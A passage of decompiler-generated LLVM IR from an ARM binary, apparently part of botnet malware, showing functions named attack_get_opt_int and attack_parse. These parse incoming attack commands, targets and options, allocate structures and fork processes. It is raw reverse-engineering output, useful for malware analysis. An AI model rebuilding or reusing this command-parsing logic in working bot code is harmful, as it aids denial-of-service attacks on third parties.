dec_label_pc_a01c:                                ; preds = %dec_label_pc_a010
  %v1_a01c = call i32 @inet_addr(i32 %v2_a010)
  %v2_a008.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_a004

; uselistorder directives
  uselistorder i32 %v1_9ff4, { 1, 0 }
  uselistorder i32 %v0_9fec, { 1, 0, 2 }
  uselistorder i32 %v0_9fec.in, { 1, 0 }
  uselistorder i32 %v0_9fcc, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a004, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_9ff4, { 1, 0 }
}

define i32 @attack_get_opt_int(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_a028 = icmp eq i32 %arg1, 0
  %v3_a02c = load i32, i32* @r4, align 4
  store i32 %v3_a02c, i32* %stack_var_-8, align 4
  %v6_a02c = load i32, i32* @lr, align 4
  br i1 %v2_a028, label %dec_label_pc_a070, label %dec_label_pc_a038

dec_label_pc_a038:                                ; preds = %entry
  %v0_a038 = load i32, i32* %r1.global-to-local, align 4
  %v1_a038 = add i32 %v0_a038, 4
  %v2_a038 = inttoptr i32 %v1_a038 to i8*
  %v3_a038 = load i8, i8* %v2_a038, align 1
  %v4_a038 = zext i8 %v3_a038 to i32
  %v9_a03c = icmp eq i32 %v4_a038, %arg3
  br i1 %v9_a03c, label %dec_label_pc_a07c, label %dec_label_pc_a060.preheader

dec_label_pc_a060.preheader:                      ; preds = %dec_label_pc_a038
  br label %dec_label_pc_a060

dec_label_pc_a050:                                ; preds = %dec_label_pc_a060
  %v1_a050 = add i32 %v0_a058.in, 12
  %v2_a050 = inttoptr i32 %v1_a050 to i8*
  %v3_a050 = load i8, i8* %v2_a050, align 1
  %v4_a050 = zext i8 %v3_a050 to i32
  %v9_a054 = icmp eq i32 %v4_a050, %arg3
  br i1 %v9_a054, label %dec_label_pc_a07c, label %dec_label_pc_a060

dec_label_pc_a060:                                ; preds = %dec_label_pc_a060.preheader, %dec_label_pc_a050
  %v0_a058.in = phi i32 [ %v0_a038, %dec_label_pc_a060.preheader ], [ %v0_a058, %dec_label_pc_a050 ]
  %v0_a060 = phi i32 [ 0, %dec_label_pc_a060.preheader ], [ %v1_a060, %dec_label_pc_a050 ]
  %v0_a058 = add i32 %v0_a058.in, 8
  %v1_a060 = add i32 %v0_a060, 1
  %v9_a064 = icmp eq i32 %v1_a060, %arg1
  store i32 %v0_a058, i32* %r1.global-to-local, align 4
  br i1 %v9_a064, label %dec_label_pc_a070, label %dec_label_pc_a050

dec_label_pc_a070:                                ; preds = %dec_label_pc_a060, %dec_label_pc_a07c, %entry, %dec_label_pc_a088
  %v2_a074 = phi i32 [ %v3_a02c, %dec_label_pc_a07c ], [ %v3_a02c, %entry ], [ %v2_a074.pre, %dec_label_pc_a088 ], [ %v3_a02c, %dec_label_pc_a060 ]
  %v0_a070 = phi i32 [ %arg4, %dec_label_pc_a07c ], [ %arg4, %entry ], [ %v3_a08c, %dec_label_pc_a088 ], [ %arg4, %dec_label_pc_a060 ]
  store i32 %v2_a074, i32* @r4, align 4
  store i32 %v6_a02c, i32* @lr, align 4
  ret i32 %v0_a070

dec_label_pc_a07c:                                ; preds = %dec_label_pc_a050, %dec_label_pc_a038
  %v0_a07c = phi i32 [ %v0_a038, %dec_label_pc_a038 ], [ %v0_a058, %dec_label_pc_a050 ]
  %v1_a07c = inttoptr i32 %v0_a07c to i32*
  %v2_a07c = load i32, i32* %v1_a07c, align 4
  %v2_a080 = icmp eq i32 %v2_a07c, 0
  br i1 %v2_a080, label %dec_label_pc_a070, label %dec_label_pc_a088

dec_label_pc_a088:                                ; preds = %dec_label_pc_a07c
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_a08c = inttoptr i32 %v2_a07c to i8*
  %v3_a08c = call i32 @util_atoi(i8* %v2_a08c, i32 10)
  %v2_a074.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_a070

; uselistorder directives
  uselistorder i32 %v1_a060, { 1, 0 }
  uselistorder i32 %v0_a058, { 1, 0, 2 }
  uselistorder i32 %v0_a058.in, { 1, 0 }
  uselistorder i32 %v0_a038, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_a070, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_a060, { 1, 0 }
}

define i32 @attack_parse(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_a098 = load i32, i32* @r5, align 4
  %v9_a098 = load i32, i32* @r6, align 4
  %v12_a098 = load i32, i32* @r7, align 4
  %v18_a098 = load i32, i32* @sb, align 4
  %v21_a098 = load i32, i32* @sl, align 4
  %v24_a098 = load i32, i32* @fp, align 4
  %v2_a09c = icmp ugt i32 %arg2, 2
  %v7_a09c = icmp eq i32 %arg2, 3
  store i1 %v7_a09c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_a0a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_a0a8, i32* @r5, align 4
  %v2_a0ac = xor i1 %v7_a09c, true
  %v3_a0ac = and i1 %v2_a09c, %v2_a0ac
  br i1 %v3_a0ac, label %dec_label_pc_a0bc, label %dec_label_pc_a0b0

dec_label_pc_a0b0:                                ; preds = %dec_label_pc_a100, %.dec_label_pc_a0b0_crit_edge, %dec_label_pc_a0f4, %dec_label_pc_a0e4, %dec_label_pc_a0bc, %entry, %dec_label_pc_a2a8
  %v1_a0b8 = phi i32 [ %v1_a0b8.pre, %.dec_label_pc_a0b0_crit_edge ], [ %v1_a0c0, %dec_label_pc_a100 ], [ %v1_a0c0, %dec_label_pc_a0f4 ], [ %v1_a0c0, %dec_label_pc_a0e4 ], [ %v1_a0c0, %dec_label_pc_a0bc ], [ %v0_a0a8, %entry ], [ %v0_a2ac, %dec_label_pc_a2a8 ]
  store i32 %v6_a098, i32* @r5, align 4
  store i32 %v9_a098, i32* @r6, align 4
  store i32 %v12_a098, i32* @r7, align 4
  store i32 %v18_a098, i32* @sb, align 4
  store i32 %v21_a098, i32* @sl, align 4
  store i32 %v24_a098, i32* @fp, align 4
  ret i32 %v1_a0b8

dec_label_pc_a0bc:                                ; preds = %entry
  %v1_a0bc = inttoptr i32 %v0_a0a8 to i32*
  %v2_a0bc = load i32, i32* %v1_a0bc, align 4
  %v1_a0c0 = and i32 %v2_a0bc, 16711680
  store i32 %v1_a0c0, i32* %r0.global-to-local, align 4
  %v3_a0c4 = udiv i32 %v2_a0bc, 16777216
  %v1_a0c8 = and i32 %v2_a0bc, 65280
  store i32 %v1_a0c8, i32* %r2.global-to-local, align 4
  %v4_a0cc = udiv i32 %v1_a0c0, 256
  %v5_a0cc = or i32 %v4_a0cc, %v3_a0c4
  %v4_a0d0 = mul nuw nsw i32 %v1_a0c8, 256
  %v5_a0d0 = or i32 %v5_a0cc, %v4_a0d0
  store i32 %v5_a0d0, i32* %r3.global-to-local, align 4
  %v5_a0d4 = call i32 @llvm.bswap.i32(i32 %v2_a0bc)
  store i32 %v5_a0d4, i32* %r1.global-to-local, align 4
  %v7_a0d8 = icmp eq i32 %arg2, 4
  store i1 %v7_a0d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a0d8, label %dec_label_pc_a0b0, label %dec_label_pc_a0e4

dec_label_pc_a0e4:                                ; preds = %dec_label_pc_a0bc
  %v1_a0e4 = add i32 %v0_a0a8, 4
  %v2_a0e4 = inttoptr i32 %v1_a0e4 to i8*
  %v3_a0e4 = load i8, i8* %v2_a0e4, align 1
  %v4_a0e4 = zext i8 %v3_a0e4 to i32
  store i32 %v4_a0e4, i32* %r3.global-to-local, align 4
  %v7_a0e8 = icmp eq i32 %arg2, 5
  store i1 %v7_a0e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a0e8, label %dec_label_pc_a0b0, label %dec_label_pc_a0f4

dec_label_pc_a0f4:                                ; preds = %dec_label_pc_a0e4
  %v1_a0f4 = add i32 %v0_a0a8, 5
  %v2_a0f4 = inttoptr i32 %v1_a0f4 to i8*
  %v3_a0f4 = load i8, i8* %v2_a0f4, align 1
  %v4_a0f4 = zext i8 %v3_a0f4 to i32
  store i32 %v4_a0f4, i32* @sb, align 4
  %v2_a0f8 = icmp eq i8 %v3_a0f4, 0
  store i1 %v2_a0f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a0f8, label %dec_label_pc_a0b0, label %dec_label_pc_a100

dec_label_pc_a100:                                ; preds = %dec_label_pc_a0f4
  %v2_a104 = mul nuw nsw i32 %v4_a0f4, 5
  store i32 %v2_a104, i32* @r7, align 4
  %v1_a108 = add i32 %arg2, -6
  store i32 %v1_a108, i32* %r3.global-to-local, align 4
  %v3_a10c = icmp ult i32 %v1_a108, %v2_a104
  %v9_a10c = icmp eq i32 %v1_a108, %v2_a104
  store i1 %v9_a10c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a10c, label %dec_label_pc_a0b0, label %dec_label_pc_a114

dec_label_pc_a114:                                ; preds = %dec_label_pc_a100
  store i32 %v4_a0f4, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_a108, i32* @r6, align 4
  %v2_a120 = call i32 @calloc(i32 %v4_a0f4, i32 24)
  store i32 %v2_a120, i32* %ip.global-to-local, align 4
  %v0_a12c = load i32, i32* @r7, align 4
  %v1_a12c = load i32, i32* @r4, align 4
  %v2_a12c = sub i32 %v1_a12c, %v0_a12c
  store i32 %v2_a12c, i32* @r7, align 4
  %v0_a130 = load i32, i32* @r5, align 4
  %v1_a130 = add i32 %v0_a130, 11
  store i32 %v1_a130, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a134

dec_label_pc_a134:                                ; preds = %dec_label_pc_a134, %dec_label_pc_a114
  %v1_a138 = phi i32 [ %v1_a164, %dec_label_pc_a134 ], [ %v2_a120, %dec_label_pc_a114 ]
  %v0_a134 = phi i32 [ %v1_a160, %dec_label_pc_a134 ], [ %v1_a130, %dec_label_pc_a114 ]
  %v1_a134 = add i32 %v0_a134, -5
  %v2_a134 = inttoptr i32 %v1_a134 to i32*
  %v3_a134 = load i32, i32* %v2_a134, align 4
  store i32 %v3_a134, i32* %r1.global-to-local, align 4
  %v2_a138 = add i32 %v1_a138, 16
  %v3_a138 = inttoptr i32 %v2_a138 to i32*
  store i32 %v3_a134, i32* %v3_a138, align 4
  %v0_a13c = load i32, i32* @r6, align 4
  %v1_a13c = add i32 %v0_a13c, -5
  store i32 %v1_a13c, i32* @r6, align 4
  %v0_a140 = load i32, i32* %r0.global-to-local, align 4
  %v1_a140 = add i32 %v0_a140, -1
  %v2_a140 = inttoptr i32 %v1_a140 to i8*
  %v3_a140 = load i8, i8* %v2_a140, align 1
  %v4_a140 = zext i8 %v3_a140 to i32
  store i32 %v4_a140, i32* %r2.global-to-local, align 4
  %v0_a144 = load i32, i32* @r7, align 4
  %v1_a144 = add i32 %v0_a144, -6
  store i32 %v1_a144, i32* %r3.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  %v9_a14c = icmp eq i32 %v1_a13c, %v1_a144
  store i1 %v9_a14c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_a140, i32* @r4, align 4
  %v2_a154 = load i32, i32* %ip.global-to-local, align 4
  %v3_a154 = add i32 %v2_a154, 20
  %v4_a154 = inttoptr i32 %v3_a154 to i8*
  store i8 %v3_a140, i8* %v4_a154, align 1
  %v0_a158 = load i32, i32* %r1.global-to-local, align 4
  %v1_a158 = load i32, i32* %ip.global-to-local, align 4
  %v2_a158 = add i32 %v1_a158, 4
  %v3_a158 = inttoptr i32 %v2_a158 to i32*
  store i32 %v0_a158, i32* %v3_a158, align 4
  %v0_a15c = load i32, i32* @lr, align 4
  %v1_a15c = trunc i32 %v0_a15c to i16
  %v2_a15c = load i32, i32* %ip.global-to-local, align 4
  %v3_a15c = inttoptr i32 %v2_a15c to i16*
  store i16 %v1_a15c, i16* %v3_a15c, align 2
  %v0_a160 = load i32, i32* %r0.global-to-local, align 4
  %v1_a160 = add i32 %v0_a160, 5
  store i32 %v1_a160, i32* %r0.global-to-local, align 4
  %v0_a164 = load i32, i32* %ip.global-to-local, align 4
  %v1_a164 = add i32 %v0_a164, 24
  store i32 %v1_a164, i32* %ip.global-to-local, align 4
  %v0_a168 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a168, label %dec_label_pc_a16c, label %dec_label_pc_a134

dec_label_pc_a16c:                                ; preds = %dec_label_pc_a134
  %v0_a16c = load i32, i32* @r6, align 4
  %v2_a16c = icmp eq i32 %v0_a16c, 0
  store i1 %v2_a16c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a16c, label %dec_label_pc_a26c, label %dec_label_pc_a174

dec_label_pc_a174:                                ; preds = %dec_label_pc_a16c
  %v0_a174 = load i32, i32* @r4, align 4
  %v1_a174 = inttoptr i32 %v0_a174 to i8*
  %v2_a174 = load i8, i8* %v1_a174, align 1
  %v3_a174 = zext i8 %v2_a174 to i32
  store i32 %v3_a174, i32* @r5, align 4
  %v2_a178 = icmp eq i8 %v2_a174, 0
  store i1 %v2_a178, i1* %cpsr_z.global-to-local, align 1
  %v0_a17c = load i32, i32* @r7, align 4
  %v1_a17c = add i32 %v0_a17c, -7
  store i32 %v1_a17c, i32* @r8, align 4
  br i1 %v2_a178, label %bb, label %dec_label_pc_a188

bb:                                               ; preds = %dec_label_pc_a174
  store i32 %v3_a174, i32* @r6, align 4
  br label %dec_label_pc_a23c

dec_label_pc_a188:                                ; preds = %dec_label_pc_a174
  store i32 %v3_a174, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_a190 = call i32 @calloc(i32 %v3_a174, i32 8)
  store i32 %v2_a190, i32* %r0.global-to-local, align 4
  %v0_a194 = load i32, i32* @r8, align 4
  %v2_a194 = icmp eq i32 %v0_a194, 0
  store i1 %v2_a194, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_a190, i32* @r6, align 4
  br i1 %v2_a194, label %dec_label_pc_a26c, label %dec_label_pc_a1a0

dec_label_pc_a1a0:                                ; preds = %dec_label_pc_a188
  %v0_a1a0 = load i32, i32* @r4, align 4
  %v1_a1a0 = add i32 %v0_a1a0, 1
  %v2_a1a0 = inttoptr i32 %v1_a1a0 to i8*
  %v3_a1a0 = load i8, i8* %v2_a1a0, align 1
  %v0_a1a4 = load i32, i32* @r7, align 4
  %v7_a1a4 = icmp eq i32 %v0_a1a4, 8
  store i1 %v7_a1a4, i1* %cpsr_z.global-to-local, align 1
  %v3_a1a8 = add i32 %v2_a190, 4
  %v4_a1a8 = inttoptr i32 %v3_a1a8 to i8*
  store i8 %v3_a1a0, i8* %v4_a1a8, align 1
  %v0_a1ac = load i32, i32* @r4, align 4
  %v1_a1ac = add i32 %v0_a1ac, 1
  store i32 %v1_a1ac, i32* %r3.global-to-local, align 4
  %v0_a1b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a1b0, label %dec_label_pc_a26c, label %dec_label_pc_a1b4

dec_label_pc_a1b4:                                ; preds = %dec_label_pc_a1a0
  %v1_a1b4 = add i32 %v0_a1ac, 2
  %v2_a1b4 = inttoptr i32 %v1_a1b4 to i8*
  %v3_a1b4 = load i8, i8* %v2_a1b4, align 1
  %v4_a1b4 = zext i8 %v3_a1b4 to i32
  store i32 %v4_a1b4, i32* @r4, align 4
  %v0_a1b8 = load i32, i32* @r7, align 4
  %v1_a1b8 = add i32 %v0_a1b8, -9
  store i32 %v1_a1b8, i32* @r7, align 4
  %v9_a1bc = icmp eq i32 %v1_a1b8, %v4_a1b4
  store i1 %v9_a1bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a1b4, i32* %r1.global-to-local, align 4
  %v5_a1c4 = icmp slt i32 %v1_a1b8, %v4_a1b4
  br i1 %v5_a1c4, label %dec_label_pc_a26c, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_a1b4
  %v7_a1c44711 = add i32 %v0_a1ac, 3
  store i32 %v7_a1c44711, i32* @r8, align 4
  %v6_a1c8812 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_a1c8812, i32* @sl, align 4
  store i32 0, i32* @fp, align 4
  br label %dec_label_pc_a214

dec_label_pc_a1d8:                                ; preds = %dec_label_pc_a214
  %v0_a1d8 = load i32, i32* @r7, align 4
  %v1_a1d8 = load i32, i32* @r4, align 4
  %v2_a1d8 = sub i32 %v0_a1d8, %v1_a1d8
  store i32 %v2_a1d8, i32* %r1.global-to-local, align 4
  %v9_a1d8 = icmp eq i32 %v0_a1d8, %v1_a1d8
  store i1 %v9_a1d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a1d8, label %dec_label_pc_a26c, label %dec_label_pc_a1e0

dec_label_pc_a1e0:                                ; preds = %dec_label_pc_a1d8
  %v3_a1e0 = mul i32 %v0_a234, 8
  store i32 %v3_a1e0, i32* %r3.global-to-local, align 4
  %v1_a1e4 = load i32, i32* @r8, align 4
  %v2_a1e4 = add i32 %v1_a1e4, %v1_a1d8
  %v3_a1e4 = inttoptr i32 %v2_a1e4 to i8*
  %v4_a1e4 = load i8, i8* %v3_a1e4, align 1
  %v6_a1e4 = zext i8 %v4_a1e4 to i32
  store i32 %v6_a1e4, i32* %r2.global-to-local, align 4
  %v0_a1e8 = load i32, i32* @r6, align 4
  %v2_a1e8 = add i32 %v0_a1e8, %v3_a1e0
  store i32 %v2_a1e8, i32* @sl, align 4
  %v1_a1ec = add i32 %v2_a1d8, -1
  store i32 %v1_a1ec, i32* %r3.global-to-local, align 4
  %v7_a1ec = icmp eq i32 %v2_a1d8, 1
  store i1 %v7_a1ec, i1* %cpsr_z.global-to-local, align 1
  %v3_a1f0 = add i32 %v2_a1e8, 4
  %v4_a1f0 = inttoptr i32 %v3_a1f0 to i8*
  store i8 %v4_a1e4, i8* %v4_a1f0, align 1
  %v0_a1f4 = load i32, i32* @r4, align 4
  %v1_a1f4 = load i32, i32* @r8, align 4
  %v2_a1f4 = add i32 %v1_a1f4, %v0_a1f4
  store i32 %v2_a1f4, i32* %r1.global-to-local, align 4
  %v0_a1f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a1f8, label %dec_label_pc_a26c, label %dec_label_pc_a1fc

dec_label_pc_a1fc:                                ; preds = %dec_label_pc_a1e0
  %v1_a1fc = add i32 %v2_a1f4, 1
  %v2_a1fc = inttoptr i32 %v1_a1fc to i8*
  %v3_a1fc = load i8, i8* %v2_a1fc, align 1
  %v4_a1fc = zext i8 %v3_a1fc to i32
  store i32 %v4_a1fc, i32* @r4, align 4
  %v0_a200 = load i32, i32* %r3.global-to-local, align 4
  %v1_a200 = add i32 %v0_a200, -1
  store i32 %v1_a200, i32* @r7, align 4
  %v2_a204 = sub i32 %v1_a200, %v4_a1fc
  %tmp46 = sub i32 0, %v2_a204
  %v6_a204 = and i32 %v1_a200, %tmp46
  %v7_a204 = icmp slt i32 %v6_a204, 0
  %v8_a204 = icmp slt i32 %v2_a204, 0
  %v9_a204 = icmp eq i32 %v1_a200, %v4_a1fc
  store i1 %v9_a204, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a1fc, i32* %r1.global-to-local, align 4
  %v2_a20c = xor i1 %v8_a204, %v7_a204
  br i1 %v2_a20c, label %dec_label_pc_a26c, label %dec_label_pc_a210

dec_label_pc_a210:                                ; preds = %dec_label_pc_a1fc
  %v1_a210 = add i32 %v2_a1f4, 2
  store i32 %v1_a210, i32* @r8, align 4
  br label %dec_label_pc_a214

dec_label_pc_a214:                                ; preds = %.thread10, %dec_label_pc_a210
  %v0_a218 = phi i32 [ %v4_a1b4, %.thread10 ], [ %v4_a1fc, %dec_label_pc_a210 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_a218 = add nuw nsw i32 %v0_a218, 1
  store i32 %v2_a218, i32* %r0.global-to-local, align 4
  %v2_a21c = call i32 @calloc(i32 %v2_a218, i32 1)
  store i32 %v2_a21c, i32* %r0.global-to-local, align 4
  %v0_a220 = load i32, i32* @fp, align 4
  %v1_a220 = add i32 %v0_a220, 1
  store i32 %v1_a220, i32* @fp, align 4
  %v1_a224 = load i32, i32* @sl, align 4
  %v2_a224 = inttoptr i32 %v1_a224 to i32*
  store i32 %v2_a21c, i32* %v2_a224, align 4
  %v0_a228 = load i32, i32* @r8, align 4
  store i32 %v0_a228, i32* %r1.global-to-local, align 4
  %v0_a22c = load i32, i32* @r4, align 4
  store i32 %v0_a22c, i32* %r2.global-to-local, align 4
  %v3_a230 = call i32 @util_memcpy(i32 %v2_a21c, i32 %v0_a228, i32 %v0_a22c)
  store i32 %v3_a230, i32* %r0.global-to-local, align 4
  %v0_a234 = load i32, i32* @fp, align 4
  %v1_a234 = load i32, i32* @r5, align 4
  %v9_a234 = icmp eq i32 %v0_a234, %v1_a234
  store i1 %v9_a234, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a234, label %dec_label_pc_a23c, label %dec_label_pc_a1d8

dec_label_pc_a23c:                                ; preds = %dec_label_pc_a214, %bb
  %v0_a23c = call i32 @__GI___errno_location()
  store i32 %v0_a23c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a244 = inttoptr i32 %v0_a23c to i32*
  store i32 0, i32* %v2_a244, align 4
  %v0_a248 = call i32 @__libc_fork()
  store i32 %v0_a248, i32* %r0.global-to-local, align 4
  %v7_a24c = icmp eq i32 %v0_a248, -1
  %. = zext i1 %v7_a24c to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_a258 = icmp eq i32 %v0_a248, 0
  store i1 %v2_a258, i1* %cpsr_z.global-to-local, align 1
  %tmp49 = icmp slt i32 %v0_a248, 1
  br i1 %tmp49, label %bb50, label %.thread14

.thread14:                                        ; preds = %dec_label_pc_a23c
  store i32 1, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_a26c

bb50:                                             ; preds = %dec_label_pc_a23c
  store i32 %., i32* %r2.global-to-local, align 4
  %v2_a264 = icmp eq i1 %v7_a24c, false
  store i1 %v2_a264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a264, label %dec_label_pc_a2b4, label %dec_label_pc_a26c

dec_label_pc_a26c:                                ; preds = %dec_label_pc_a1fc, %dec_label_pc_a1e0, %dec_label_pc_a1d8, %dec_label_pc_a1b4, %.thread14, %bb50, %dec_label_pc_a1a0, %dec_label_pc_a188, %dec_label_pc_a16c
  store i32 %v2_a120, i32* %r3.global-to-local, align 4
  %v2_a270 = icmp eq i32 %v2_a120, 0
  store i1 %v2_a270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a270, label %bb52, label %bb51

bb51:                                             ; preds = %dec_label_pc_a26c
  store i32 %v2_a120, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %dec_label_pc_a26c, %bb51
  store i32 41596, i32* @lr, align 4
  %v1_a278 = xor i1 %v2_a270, true
  call void @__pseudo_cond_branch(i1 %v1_a278, i32 ptrtoint (i32* @global_var_1446c.63 to i32))
  %v0_a27c = load i32, i32* @r6, align 4
  %v2_a27c = icmp eq i32 %v0_a27c, 0
  store i1 %v2_a27c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a27c, label %.dec_label_pc_a0b0_crit_edge, label %dec_label_pc_a284

.dec_label_pc_a0b0_crit_edge:                     ; preds = %bb52
  %v1_a0b8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a0b0

dec_label_pc_a284:                                ; preds = %bb52
  %v0_a284 = load i32, i32* @r5, align 4
  %v2_a284 = icmp eq i32 %v0_a284, 0
  store i1 %v2_a284, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a284, label %dec_label_pc_a2a8, label %dec_label_pc_a28c

dec_label_pc_a28c:                                ; preds = %dec_label_pc_a284
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_a290

dec_label_pc_a290:                                ; preds = %dec_label_pc_a290, %dec_label_pc_a28c
  %v1_a290 = phi i32 [ 0, %dec_label_pc_a28c ], [ %v1_a29c, %dec_label_pc_a290 ]
  %v0_a290 = phi i32 [ %v0_a27c, %dec_label_pc_a28c ], [ %v0_a2a8.pre, %dec_label_pc_a290 ]
  %v4_a290 = mul i32 %v1_a290, 8
  %v5_a290 = add i32 %v4_a290, %v0_a290
  %v6_a290 = inttoptr i32 %v5_a290 to i32*
  %v7_a290 = load i32, i32* %v6_a290, align 4
  store i32 %v7_a290, i32* %r0.global-to-local, align 4
  %v2_a294 = icmp eq i32 %v7_a290, 0
  store i1 %v2_a294, i1* %cpsr_z.global-to-local, align 1
  store i32 41628, i32* @lr, align 4
  %v1_a298 = xor i1 %v2_a294, true
  call void @__pseudo_cond_branch(i1 %v1_a298, i32 ptrtoint (i32* @global_var_1446c.63 to i32))
  %v0_a29c = load i32, i32* @r4, align 4
  %v1_a29c = add i32 %v0_a29c, 1
  store i32 %v1_a29c, i32* @r4, align 4
  %v0_a2a0 = load i32, i32* @r5, align 4
  %v9_a2a0 = icmp eq i32 %v0_a2a0, %v1_a29c
  store i1 %v9_a2a0, i1* %cpsr_z.global-to-local, align 1
  %v0_a2a8.pre = load i32, i32* @r6, align 4
  br i1 %v9_a2a0, label %dec_label_pc_a2a8, label %dec_label_pc_a290

dec_label_pc_a2a8:                                ; preds = %dec_label_pc_a290, %dec_label_pc_a284
  %v0_a2a8 = phi i32 [ %v0_a27c, %dec_label_pc_a284 ], [ %v0_a2a8.pre, %dec_label_pc_a290 ]
  store i32 %v0_a2a8, i32* @r0, align 4
  %v0_a2ac = call i32 @free()
  store i32 %v0_a2ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a0b0

dec_label_pc_a2b4:                                ; preds = %bb50
  store i32 ptrtoint (i8** @global_var_235e8.65 to i32), i32* %r3.global-to-local, align 4
  %v2_a2b8 = load i8, i8* bitcast (i8** @global_var_235e8.65 to i8*), align 4
  %v3_a2b8 = zext i8 %v2_a2b8 to i32
  store i32 %v3_a2b8, i32* %r0.global-to-local, align 4
  %v2_a2bc = icmp eq i8 %v2_a2b8, 0
  store i1 %v2_a2bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a2bc, label %dec_label_pc_a320, label %dec_label_pc_a2c4

dec_label_pc_a2c4:                                ; preds = %dec_label_pc_a2b4
  store i32 ptrtoint (i32* @global_var_235ec.67 to i32), i32* %r3.global-to-local, align 4
  %v2_a2c8 = load i32, i32* @global_var_235ec.67, align 4
  store i32 %v2_a2c8, i32* %r1.global-to-local, align 4
  %v1_a2cc = inttoptr i32 %v2_a2c8 to i32*
  %v2_a2cc = load i32, i32* %v1_a2cc, align 4
  store i32 %v2_a2cc, i32* @ip, align 4
  %v1_a2d4 = add i32 %v2_a2cc, 4
  %v2_a2d4 = inttoptr i32 %v1_a2d4 to i8*
  %v3_a2d4 = load i8, i8* %v2_a2d4, align 1
  %v4_a2d4 = zext i8 %v3_a2d4 to i32
  store i32 %v4_a2d4, i32* %r3.global-to-local, align 4
  %v9_a2d8 = icmp eq i8 %v3_a2d4, %v3_a0e4
  store i1 %v9_a2d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a2d8, label %dec_label_pc_a300, label %dec_label_pc_a2e0

dec_label_pc_a2e0:                                ; preds = %dec_label_pc_a2c4, %dec_label_pc_a2ec
  %v0_a2e0 = phi i32 [ %v1_a2e0, %dec_label_pc_a2ec ], [ 0, %dec_label_pc_a2c4 ]
  %v1_a2e0 = add i32 %v0_a2e0, 1
  store i32 %v1_a2e0, i32* %r2.global-to-local, align 4
  %v9_a2e4 = icmp eq i32 %v1_a2e0, %v3_a2b8
  store i1 %v9_a2e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a2e4, label %dec_label_pc_a320, label %dec_label_pc_a2ec

dec_label_pc_a2ec:                                ; preds = %dec_label_pc_a2e0
  %v4_a2ec = mul i32 %v1_a2e0, 4
  %v5_a2ec = add i32 %v4_a2ec, %v2_a2c8
  %v6_a2ec = inttoptr i32 %v5_a2ec to i32*
  %v7_a2ec = load i32, i32* %v6_a2ec, align 4
  store i32 %v7_a2ec, i32* @ip, align 4
  %v1_a2f4 = add i32 %v7_a2ec, 4
  %v2_a2f4 = inttoptr i32 %v1_a2f4 to i8*
  %v3_a2f4 = load i8, i8* %v2_a2f4, align 1
  %v4_a2f4 = zext i8 %v3_a2f4 to i32
  store i32 %v4_a2f4, i32* %r3.global-to-local, align 4
  %v9_a2f8 = icmp eq i8 %v3_a2f4, %v3_a0e4
  store i1 %v9_a2f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a2f8, label %dec_label_pc_a300, label %dec_label_pc_a2e0

dec_label_pc_a300:                                ; preds = %dec_label_pc_a2ec, %dec_label_pc_a2c4
